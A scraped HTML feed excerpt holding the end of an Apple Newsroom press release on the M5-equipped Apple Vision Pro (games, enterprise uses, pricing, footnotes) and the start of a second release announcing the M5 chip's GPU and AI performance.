                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:apple-immersive-video-03">
                                
                                <div>
                                    <div>In “Backcountry Skiing” from Red Bull, audiences are transported into the wilderness of Revelstoke, British Columbia, where the world’s top freeskiers push their limits on remote, untouched slopes.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-Immersive-films-Red-Bull-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-Immersive-films-Red-Bull-251015_big" aria-label="Download media, Image from the Backcountry Skiing episode of the Apple Immersive series “World of Red Bull.”"></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-ea6440e2e7fe17c60e2f171d76f47471" aria-labelledby="gallery-dotnav-ea6440e2e7fe17c60e2f171d76f47471" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:apple-immersive-video-04">
                                
                                <div>
                                    <div>In the latest episode of the aerial travel series, <em>Elevated</em>, Tim Robbins guides viewers above Maine, sweeping over rugged coastlines, pristine lakes, and forests bursting with fall’s fiery palette of orange, crimson, and gold.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-Immersive-films-Elevated-Maine-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-Immersive-films-Elevated-Maine-251015_big" aria-label="Download media, Image from the Maine episode of the Apple Immersive series “Elevated.”"></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>Gaming on Apple Vision Pro is next level with its ultra-high-resolution displays, advanced Spatial Audio system, low latency, and responsive controls across a variety of input methods, including popular game controllers like Sony DualSense, which now supports multidevice pairing.
</div>
 

    
    
    


    
    <div data-component-list="ScrollAnimationDefault AutoPlayVideo">
        <div>With support for the PlayStation VR2 Sense controller, players get a new class of immersive games with high-performance motion tracking in six degrees of freedom, finger touch detection, and vibration support.</div>
        
            <a aria-label="Download video: Apple Vision Pro Gaming" data-analytics-title="Download video - Apple Vision Pro Gaming" download="" href="https://www.apple.com/newsroom/videos/2025/autoplay/10/apple-vision-pro-sony-playstation-vr2-sense-controller/downloads/Apple-Vision-Pro-Sony-PlayStation-VR2-Sense-controller-251015.zip">
            </a>
        
    </div>






    
    
    


     
     
    
    
        <div>Players will be able to enjoy iPad games like Where Winds Meet, POOLS, and Sniper Elite 4, fun spatial games like Porta Nubi and <a href="https://apps.apple.com/us/app/glassbreakers/id6596780523" target="_blank">Glassbreakers: Champions of Moss</a>, and the latest titles on consoles and PCs with apps like Portal and Steam Link. And with support for the PlayStation VR2 Sense controller, players get a new class of immersive games with high-performance motion tracking in six degrees of freedom, finger touch detection, and vibration support. Elu Legend, Pickle Pro, Ping Pong Club, and Spatial Rifts are some of the first games available with support for the PlayStation VR2 controller.
</div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="avp-games">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-c40b3b062c311d29c500239ff9dbf626" href="#gallery-c40b3b062c311d29c500239ff9dbf626" data-ac-gallery-trigger="gallery-c40b3b062c311d29c500239ff9dbf626"><span>Artwork for Glassbreakers: Champions of Moss.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-b31c14552d3e86b356b6f912584a2e96" href="#gallery-b31c14552d3e86b356b6f912584a2e96" data-ac-gallery-trigger="gallery-b31c14552d3e86b356b6f912584a2e96"><span>Artwork for Control.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-c18f6cae935200220988b907114424e0" href="#gallery-c18f6cae935200220988b907114424e0" data-ac-gallery-trigger="gallery-c18f6cae935200220988b907114424e0"><span>Artwork for Where Winds Meet.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-5a3df17243b5a094e2ce1c1a6e21b1dc" href="#gallery-5a3df17243b5a094e2ce1c1a6e21b1dc" data-ac-gallery-trigger="gallery-5a3df17243b5a094e2ce1c1a6e21b1dc"><span>Artwork for POOLS.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-0c5cb3b3c44bcc7aaaf08abc759cf920" href="#gallery-0c5cb3b3c44bcc7aaaf08abc759cf920" data-ac-gallery-trigger="gallery-0c5cb3b3c44bcc7aaaf08abc759cf920"><span>Artwork for Sniper Elite 4.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-c40b3b062c311d29c500239ff9dbf626" aria-labelledby="gallery-dotnav-c40b3b062c311d29c500239ff9dbf626" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:avp-games-01">
                                
                                <div>
                                    <div>Glassbreakers: Champions of Moss will launch November 13 on Apple Arcade, joining over 200 fun games available on the service for Apple Vision Pro.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-Glassbreakers-Champions-of-Moss-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-Glassbreakers-Champions-of-Moss-251015_big" aria-label="Download media, Artwork for Glassbreakers: Champions of Moss."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-b31c14552d3e86b356b6f912584a2e96" aria-labelledby="gallery-dotnav-b31c14552d3e86b356b6f912584a2e96" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:avp-games-02">
                                
                                <div>
                                    <div>With the upgraded Apple Vision Pro, players can enjoy hardware-accelerated ray tracing and mesh shading in popular games, including Control, thanks to the 10-core GPU architecture in M5.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-Control-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-Control-251015_big" aria-label="Download media, Artwork for Control."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-c18f6cae935200220988b907114424e0" aria-labelledby="gallery-dotnav-c18f6cae935200220988b907114424e0" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:avp-games-03">
                                
                                <div>
                                    <div>With Apple Vision Pro, players can enjoy new and popular iPad games like Where Winds Meet, POOLS, and Sniper Elite 4.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-Where-Winds-Meet-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-Where-Winds-Meet-251015_big" aria-label="Download media, Artwork for Where Winds Meet."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-5a3df17243b5a094e2ce1c1a6e21b1dc" aria-labelledby="gallery-dotnav-5a3df17243b5a094e2ce1c1a6e21b1dc" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:avp-games-04">
                                
                                <div>
                                    <div>With Apple Vision Pro, players can enjoy new and popular iPad games like Where Winds Meet, POOLS, and Sniper Elite 4.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-POOLS-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-POOLS-251015_big" aria-label="Download media, Artwork for POOLS."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-0c5cb3b3c44bcc7aaaf08abc759cf920" aria-labelledby="gallery-dotnav-0c5cb3b3c44bcc7aaaf08abc759cf920" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:avp-games-05">
                                
                                <div>
                                    <div>With Apple Vision Pro, players can enjoy new and popular iPad games like Where Winds Meet, POOLS, and Sniper Elite 4.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-Sniper-Elite-4-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-Sniper-Elite-4-251015_big" aria-label="Download media, Artwork for Sniper Elite 4."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>Enhanced Capabilities for Pro Users and Enterprises</strong>
</h2>
                 
             
                 <div>With Apple Vision Pro, users can supercharge their workflows and discover new ways to realize their creative visions. Artists can design new works using apps like Crayon and Da Vinci Eye. Photographers can edit images with color accuracy from any location and in any lighting condition using Pixelmator on <a href="https://www.apple.com/newsroom/2025/10/apple-unveils-new-14-inch-macbook-pro-powered-by-the-m5-chip/" target="_blank">MacBook Pro</a> with Mac Virtual Display. Filmmakers can scout locations from anywhere by viewing spatial media — including panoramas and spatial videos shot on iPhone — on a large wraparound display. And pro users can assemble and rehearse their presentations while in a seat-for-seat replica of the Steve Jobs Theater at Apple Park using Keynote. With <a href="https://www.apple.com/shop/product/HS9U2" target="_blank">Logitech Muse</a> — a digital pencil built for Vision Pro — users can create and collaborate with a new level of precision. Apps like Crayon, doppl by Interaptix, Sketch Pro, and Spatial Analogue are adding support for Muse over the coming weeks.
</div>
                 
             
                 <div>Businesses around the world are harnessing the power of spatial computing on Apple Vision Pro every day to invent new solutions and streamline operations across design, education, healthcare, sales, and more. CAE, the multinational technology company that specializes in simulation and instruction solutions, uses Vision Pro to help pilots complete training activities outside of specialized centers, featuring true-to-life flight deck environments and scenarios. At Porsche, drivers can visualize and personalize new vehicles in select showrooms before taking delivery. And by seamlessly blending digital content with the physical world, Visage provides high-quality, three-dimensional medical imaging, helping hospitals like UC San Diego Health improve patient care.
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="avp-businesses">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-f3343e529610f44e091ba701efa57450" href="#gallery-f3343e529610f44e091ba701efa57450" data-ac-gallery-trigger="gallery-f3343e529610f44e091ba701efa57450"><span>An image of CAE using Apple Vision Pro for a flight training simulation.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-d4da6fde265745d2310df2ab2f203a19" href="#gallery-d4da6fde265745d2310df2ab2f203a19" data-ac-gallery-trigger="gallery-d4da6fde265745d2310df2ab2f203a19"><span>An image of the ThingLink app using Apple Vision Pro for an immersive instruction manual.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-af2e7fc2a5448105f3d7db2cab5afe16" href="#gallery-af2e7fc2a5448105f3d7db2cab5afe16" data-ac-gallery-trigger="gallery-af2e7fc2a5448105f3d7db2cab5afe16"><span>An image of Apple Vision Pro being used to provide 3D medical imaging.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-f3343e529610f44e091ba701efa57450" aria-labelledby="gallery-dotnav-f3343e529610f44e091ba701efa57450" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:avp-businesses-01">
                                
                                <div>
                                    <div>Businesses around the world are harnessing the power of spatial computing every day to invent new solutions and streamline operations. CAE uses Apple Vision Pro to help pilots complete training activities with true-to-life flight deck environments and scenarios.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-CAE-simulation-and-instruction-solutions-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-CAE-simulation-and-instruction-solutions-251015_big" aria-label="Download media, An image of CAE using Apple Vision Pro for a flight training simulation."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-d4da6fde265745d2310df2ab2f203a19" aria-labelledby="gallery-dotnav-d4da6fde265745d2310df2ab2f203a19" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:avp-businesses-02">
                                
                                <div>
                                    <div>With ThingLink Capture, users can scan objects on iPhone or iPad and upload them to Apple Vision Pro, making it easy to create interactive training experiences using 3D models.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-ThingLink-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-ThingLink-251015_big" aria-label="Download media, An image of the ThingLink app using Apple Vision Pro for an immersive instruction manual."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-af2e7fc2a5448105f3d7db2cab5afe16" aria-labelledby="gallery-dotnav-af2e7fc2a5448105f3d7db2cab5afe16" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:avp-businesses-03">
                                
                                <div>
                                    <div>By seamlessly blending digital content with the physical world, Visage uses Vision Pro to provide high-quality, three-dimensional medical imaging, helping hospitals like UC San Diego Health improve patient care.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-Complete-HeartX-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-Complete-HeartX-251015_big" aria-label="Download media, An image of Apple Vision Pro being used to provide 3D medical imaging."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>Apple Vision Pro and the Environment</strong>
</h2>
                 
             
                 <div>Apple 2030 is the company’s ambitious plan to be carbon neutral across its entire footprint by the end of this decade by reducing product emissions from their three biggest sources: materials, electricity, and transportation. Apple Vision Pro is made with 100 percent recycled aluminum in the frame and battery enclosure, 100 percent recycled rare earth elements in all magnets, and 100 percent recycled cobalt in the battery. Vision Pro is designed to last and meets Apple’s high standards for energy efficiency and safe chemistry. The paper packaging is 100 percent fiber-based and can be easily recycled.
</div>
                 
             
         </div>
 

    
    
    


     
     
    
    
        <div>
             
                 
                 
             
                 <div><ul>
<li>Apple Vision Pro with the M5 chip and Dual Knit Band starts at <strong>$3,499</strong> (U.S.), and is available in 256GB, 512GB, and 1TB storage capacities.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Customers can pre-order Apple Vision Pro with the M5 chip and Dual Knit Band today in <em>Australia</em>, <em>Canada</em>, <em>France</em>, <em>Germany</em>, <em>Hong Kong, Japan</em>, the <em>UAE</em>, the <em>UK</em>, and the <em>U.S. </em>It will be available for pre-order in <em>China mainland</em> and <em>Singapore</em> on Friday, October 17.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Apple Vision Pro with the M5 chip and Dual Knit Band will be available in Apple Store locations in <em>Australia</em>, <em>Canada</em>, <em>China mainland</em>, <em>Hong Kong</em>, <em>France</em>, <em>Germany</em>, <em>Japan</em>, <em>Singapore</em>, the <em>UAE</em>, the <em>UK</em>, and the <em>U.S.</em> on Wednesday, October 22. It will be available in <em>South Korea</em> and <em>Taiwan</em> later.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Customers can <a href="https://www.apple.com/retail/instore-shopping-session/session-selection/?topic=visionpro" target="_blank">book a demo</a> of Apple Vision Pro online. Demos are hosted at all Apple Store locations where Vision Pro is available. Demos of the latest Vision Pro will feature the new Dual Knit Band, and customers can ask to see new features, apps, and experiences, including the Spatial Gallery app, Apple Intelligence features like Genmoji and Writing Tools, and extended previews of several Apple Immersive experiences, including the new sports documentary <em>Tour De Force </em>from CANAL+ and MotoGP in select markets.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Apple Vision Pro comes with the new Dual Knit Band, a Light Seal, two Light Seal Cushions, an Apple Vision Pro Cover for the front of the device, Polishing Cloth, Battery, USB-C Charge Cable, and the 40W Dynamic Power Adapter with 60W Max.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Dual Knit Band is available to purchase separately for <strong>$99</strong> (U.S.).</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Apple Vision Pro Travel Case is available for <strong>$199</strong> (U.S.).</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>For users who require vision correction, ZEISS Optical Inserts — Readers will be available for <strong>$99</strong> (U.S.), and ZEISS Optical Inserts — Prescription will be available for <strong>$149</strong> (U.S.).<sup>5</sup></li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Logitech Muse is now available to pre-order for <strong>$129.95 </strong>(U.S.) from <a href="https://www.logitech.com/" target="_blank" rel="nofollow" data-analytics-exit-link="">logitech.com</a> and the <a href="https://www.apple.com/shop/product/HS9U2" target="_blank">Apple Store online</a> in countries and regions where Apple Vision Pro is available. It will be available alongside Apple Vision Pro with M5 and the Dual Knit Band on Wednesday, October 22.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>PlayStation VR2 Sense controller and Controller Charging Station will be available for <strong>$249.95</strong> (U.S.) from the Apple Store online in the U.S. beginning Tuesday, November 11.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>AppleCare delivers exceptional service and support, with flexible options for Apple users. Customers can choose AppleCare+ to cover Apple Vision Pro, or in the U.S., AppleCare One to protect multiple products in one simple plan. Both plans include coverage for accidents like drops and spills, theft and loss protection on eligible products, battery replacement service, and 24/7 support from Apple Experts. For more information, visit <a href="https://www.apple.com/applecare/" target="_blank">apple.com/applecare</a>.</li>
</ul>
</div>
                 
             
         </div>
 

    
    
    




    
    
        
    


    
    
    



    
    
    




    




    
    
    





    
    
    <div>
            <ol>
<li>Image Playground is available in English (Australia, Canada, India, Singapore, UK, U.S.), French (Canada, France), German, Italian, Japanese, and Spanish (Mexico, Spain) when Apple Intelligence is enabled. Feature availability varies by region.</li>
<li>Testing conducted by Apple in August and September 2025 using preproduction Apple Vision Pro (M5) units and software. Testing consisted of full battery discharge while performing each of the following tasks: video playback, internet browsing, spatial video capture, and FaceTime. Video playback tested in conjunction with an Environment, using 2D movie content purchased from the Apple TV app. Internet browsing tested using 20 popular websites. FaceTime tested between two Apple Vision Pro units with Personas enabled. Tested with Wi‑Fi associated to a network. Battery life depends on device settings, usage, network, environmental conditions, and many other factors. Battery tests are conducted using specific Apple Vision Pro units; actual results may vary.</li>
<li>Testing conducted by Apple in September 2025 using preproduction Apple Vision Pro (M5) and production Apple Vision Pro (M2) units. Up to 2x faster performance results were achieved when tested with prerelease Draw Things v1.20250820.0 on Apple Vision Pro (M5), v1.20250903.0 on Apple Vision Pro (M2), and a 768x768 text-to-image generation with step-distilled Qwen Image model at 6-bit quantization in two steps. When tested with Photos app by creating spatial scenes from photos, performance results were up to 1.5x faster. Performance tests are conducted using specific Apple Vision Pro units and reflect the approximate performance of Apple Vision Pro.</li>
<li>Additional information about titles from the Audi F1 Project, the BBC, HYBE, and Red Bull will be provided by these creators closer to their availability.</li>
<li>A valid prescription is required. Not all prescriptions are supported. Vision correction accessories are sold separately. ZEISS Optical Inserts — Prescription are only available to purchase online.</li>
</ol>

        </div>



    
    
    






    















	

		
		
			
























		
		

</article>



</section>
</main>



<div>
            Stay up to date with the latest articles from Apple Newsroom.
        </div>
	

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Apple M5 chip (1002 pts)]]></title>
            <link>https://www.apple.com/newsroom/2025/10/apple-unleashes-m5-the-next-big-leap-in-ai-performance-for-apple-silicon/</link>
            <guid>45591799</guid>
            <pubDate>Wed, 15 Oct 2025 13:02:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.apple.com/newsroom/2025/10/apple-unleashes-m5-the-next-big-leap-in-ai-performance-for-apple-silicon/">https://www.apple.com/newsroom/2025/10/apple-unleashes-m5-the-next-big-leap-in-ai-performance-for-apple-silicon/</a>, See on <a href="https://news.ycombinator.com/item?id=45591799">Hacker News</a></p>
<div id="readability-page-1" class="page">


	
    







 
<nav id="ac-localnav" lang="en-US" role="navigation" aria-label="Newsroom" data-analytics-region="local nav" data-sticky="">
	
    
    
        




    
    
    
	
	

</nav>





<main id="main" role="main"> 




<span id="opens-in-new-window">opens in new window</span>
<section>
<article data-analytics-activitymap-region-id="article">






    
    
    









    





    <div>
        
		
        <div>
                    
                    
                        <span>PRESS RELEASE</span>
                    
                    
                        <span>October 15, 2025</span>
                    
                    
                </div>

        <div>
                
                
                
                    <h2>
                        
    
        Apple unleashes M5, the&nbsp;next big leap in AI performance for Apple&nbsp;silicon
    

                    </h2>
                
            </div>

        <div>
                
                
                    M5 delivers over 4x the peak GPU compute performance for AI compared to M4, featuring a next-generation GPU with a Neural Accelerator in each core, a more powerful CPU, a faster Neural Engine, and higher unified memory bandwidth
                
            </div>

        
            
    
    
    
    
    

        

    </div>







    
    
    


    
        
        
        
        
            <figure aria-label="Media, A graphic representation of Apple’s M5 chip against a black background.">
                <div>
                         
                            
                            <div>
                                M5 is Apple’s next-generation system on a chip built for AI, resulting in a faster, more efficient, and more capable chip for the 14-inch MacBook Pro, iPad Pro, and Apple Vision Pro.
                            </div>
                        
                        
                        
                        
                        <a href="https://www.apple.com/newsroom/images/2025/10/apple-unleashes-m5-the-next-big-leap-in-ai-performance-for-apple-silicon/article/Apple-M5-hero-251015.zip" download="" data-analytics-title="download image - Apple-M5-hero-251015_inline" aria-label="Download media, A graphic representation of Apple’s M5 chip against a black background."></a>
                    </div>
            </figure>
        
    












    
    
    


     
     
    
    
        <div>
             
                 <div><span>CUPERTINO, CALIFORNIA</span> Apple today announced M5, delivering the next big leap in AI performance and advances to nearly every aspect of the chip. Built using third-generation 3-nanometer technology, M5 introduces a next-generation 10-core GPU architecture with a Neural Accelerator in each core, enabling GPU-based AI workloads to run dramatically faster, with over 4x the peak GPU compute performance compared to M4.<sup>1</sup> The GPU also offers enhanced graphics capabilities and third-generation ray tracing that combined deliver a graphics performance that is up to 45 percent higher than M4.<sup>1</sup> M5 features the world’s fastest performance core, with up to a 10-core CPU made up of six efficiency cores and up to four performance cores.<sup>2</sup> Together, they deliver up to 15 percent faster multithreaded performance over M4.<sup>1</sup> M5 also features an improved 16-core Neural Engine, a powerful media engine, and a nearly 30 percent increase in unified memory bandwidth to 153GB/s.<sup>1</sup> M5 brings its industry-leading power-efficient performance to the new <a href="https://www.apple.com/newsroom/2025/10/apple-unveils-new-14-inch-macbook-pro-powered-by-the-m5-chip/" target="_blank">14-inch MacBook Pro</a>, <a href="https://www.apple.com/newsroom/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/" target="_blank">iPad Pro</a>, and <a href="https://www.apple.com/newsroom/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/" target="_blank">Apple Vision Pro</a>, allowing each device to excel in its own way. All are available for pre-order today.
</div>
                 
             
                 <div>“M5 ushers in the next big leap in AI performance for Apple silicon,” said Johny Srouji, Apple’s senior vice president of Hardware Technologies. “With the introduction of Neural Accelerators in the GPU, M5 delivers a huge boost to AI workloads. Combined with a big increase in graphics performance, the world’s fastest CPU core, a faster Neural Engine, and even higher unified memory bandwidth, M5 brings far more performance and capabilities to MacBook Pro, iPad Pro, and Apple Vision Pro.”
</div>
                 
             
         </div>
 

    
    
    


    
        
        
        
        
            <figure aria-label="Media, A graphic representation of Apple’s M5 chip against a black background.">
                <div>
                         
                            
                            <div>
                                M5 unleashes next-level AI performance with its next-generation GPU architecture, powerful CPU, faster Neural Engine, and higher unified memory bandwidth.
                            </div>
                        
                        
                        
                        
                        <a href="https://www.apple.com/newsroom/images/2025/10/apple-unleashes-m5-the-next-big-leap-in-ai-performance-for-apple-silicon/article/Apple-M5-chip-251015.zip" download="" data-analytics-title="download image - Apple-M5-chip-251015_inline" aria-label="Download media, A graphic representation of Apple’s M5 chip against a black background."></a>
                    </div>
            </figure>
        
    












    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>A Next-Generation GPU Architecture Optimized for AI and Graphics</strong>
</h2>
                 
             
                 <div>With the next-generation GPU architecture in M5, every compute block of the chip is optimized for AI. The 10-core GPU features a dedicated Neural Accelerator in each core, delivering over 4x peak GPU compute compared to M4, and over 6x peak GPU compute for AI performance compared to M1.<sup>1</sup> And now with M5, the new 14-inch MacBook Pro and iPad Pro benefit from dramatically accelerated processing for AI-driven workflows, such as running diffusion models in apps like Draw Things, or running large language models locally using platforms like webAI.
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="m5-chip-workflows">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-01665f6cca3c2b1e6a9f62c9f7c4fc0a" href="#gallery-01665f6cca3c2b1e6a9f62c9f7c4fc0a" data-ac-gallery-trigger="gallery-01665f6cca3c2b1e6a9f62c9f7c4fc0a"><span>The Draw Things app, shown on iPad Pro with the Magic Keyboard.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-ffb630d29255856c655213d81b9b08df" href="#gallery-ffb630d29255856c655213d81b9b08df" data-ac-gallery-trigger="gallery-ffb630d29255856c655213d81b9b08df"><span>The LM Studio app.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-01665f6cca3c2b1e6a9f62c9f7c4fc0a" aria-labelledby="gallery-dotnav-01665f6cca3c2b1e6a9f62c9f7c4fc0a" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:draw-things">
                                
                                <div>
                                    <div>Apps like Draw Things on the new 14-inch MacBook Pro and iPad Pro can get significant performance increases by using Apple’s built-in frameworks and APIs for build solutions for their apps.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-unleashes-m5-the-next-big-leap-in-ai-performance-for-apple-silicon/article/Apple-M5-Draw-Things-251015.zip" download="" data-analytics-title="download image - Apple-M5-Draw-Things-251015_big" aria-label="Download media, The Draw Things app, shown on iPad Pro with the Magic Keyboard."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-ffb630d29255856c655213d81b9b08df" aria-labelledby="gallery-dotnav-ffb630d29255856c655213d81b9b08df" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:lm-studio">
                                
                                <div>
                                    <div>The Neural Accelerators on M5 increase performance for GPU-based AI workloads running on device within apps like LM Studio.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-unleashes-m5-the-next-big-leap-in-ai-performance-for-apple-silicon/article/Apple-M5-LM-Studio-251015.zip" download="" data-analytics-title="download image - Apple-M5-LM-Studio-251015_big" aria-label="Download media, The LM Studio app."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>The next-generation GPU and enhanced shader cores in M5 also deliver increased graphics performance, achieving up to 30 percent faster performance compared to M4 and up to 2.5x faster performance than M1.<sup>1</sup> M5 also includes Apple’s third-generation ray-tracing engine, providing up to a 45 percent graphics uplift in apps using ray tracing.<sup>1</sup> Combined with rearchitected second-generation dynamic caching, the GPU provides smoother gameplay, more realistic visuals in 3D applications, and faster rendering times for complex graphics projects and other visually intensive applications. With M5, Apple Vision Pro renders 10 percent more pixels with the micro-OLED displays, and refresh rates increase up to 120Hz, resulting in crisper details, more fluid display performance, and reduced motion blur.
</div>
 

    
    
    






  
    
    
    
    
      <figure aria-label="Media, Gameplay for Cyberpunk 2077 on Mac.">
        <div>
             
              
              <div>
                The next-generation GPU, enhanced shader cores, second-generation dynamic caching, and third-generation ray-tracing engine on M5 bring more realistic visuals, faster rendering times, and smoother gameplay in titles like Cyberpunk 2077.
              </div>
            
            
            
            
            <a href="https://www.apple.com/newsroom/images/2025/10/apple-unleashes-m5-the-next-big-leap-in-ai-performance-for-apple-silicon/article/Apple-M5-gaming-Cyberpunk-2077-Ultimate-Edition-251015.zip" download="" data-analytics-title="download image - Apple-M5-gaming-Cyberpunk-2077-Ultimate-Edition-251015_big" aria-label="Download media, Gameplay for Cyberpunk 2077 on Mac."></a>
          </div>
      </figure>
    
  








    
    
    


     
     
    
    
        <div>
             
                 <div>The GPU architecture is engineered for seamless integration with Apple’s software frameworks. Applications using built-in Apple frameworks and APIs — like Core ML, Metal Performance Shaders, and Metal 4 — can automatically see immediate increases in performance. Developers can also build solutions for their apps by directly programming the Neural Accelerators using Tensor APIs in Metal&nbsp;4.
</div>
                 
             
                 <h2><strong>A Faster Neural Engine to Power Intelligent Features</strong>
</h2>
                 
             
                 <div>The faster 16-core Neural Engine delivers powerful AI performance with incredible energy efficiency, complementing the Neural Accelerators in the CPU and GPU to make M5 fully optimized for AI workloads. For example, AI-powered features on Apple Vision Pro — like the ability to transform 2D photos into spatial scenes in the Photos app, or generating a Persona — operate with greater speed and efficiency.
</div>
                 
             
         </div>
 

    
    
    





    
    
    


     
     
    
    
